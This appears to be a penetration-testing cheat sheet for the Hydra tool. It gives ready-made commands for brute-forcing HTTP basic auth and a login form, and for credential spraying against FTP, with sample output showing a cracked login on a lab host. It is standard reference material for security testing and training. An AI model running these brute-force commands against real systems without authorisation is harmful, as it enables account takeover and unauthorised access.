---
title: "Hydra"
date: 2024-7-2
tags: ["Hydra", "Password Cracking", "Brute Force", "Authentication", "Web Exploitation", "Credential"]
---

### HTTP basic auth

```console
hydra -L <USERS_FILE> -P <PASSWORD_FILE> -s <TARGET_PORT> -f <TARGET> http-get /
```

```console
+-------------------------------------------+
| -s : port                                 |
| -L : usernames file                       |
| -P : passwords file                       |
| -f : exit when a login/pass pair is found |
+-------------------------------------------+
```

### Web Page Login Form

```console
hydra <TARGET> -l <USER> -P /usr/share/seclists/Passwords/500-worst-passwords.txt http-post-form '/login.php:username=admin&password=^PASS^&remember=yes:Incorrect password'
```

```console
+-------------------------------------------+
| -l                 : username             |
| -P                 : wordlist             |
| http-post-form     : service              |
| /login.php         : action               |
| ^PASS^             : payload indicator    |
| Incorrect password : login failure string |
+-------------------------------------------+
```

### Password spraying with user:password format

```console
hydra -C <CREDS_FILE> <PROTOCOL>://<TARGET>
```

```console {class="sample-code"}
hydra -C creds.txt ftp://172.16.1.1
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-28 11:36:09
[DATA] max 16 tasks per 1 server, overall 16 tasks, 19 login tries, ~2 tries per task
[DATA] attacking ftp://172.16.1.1:21/
[21][ftp] host: 172.16.1.1   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-28 11:36:46
```
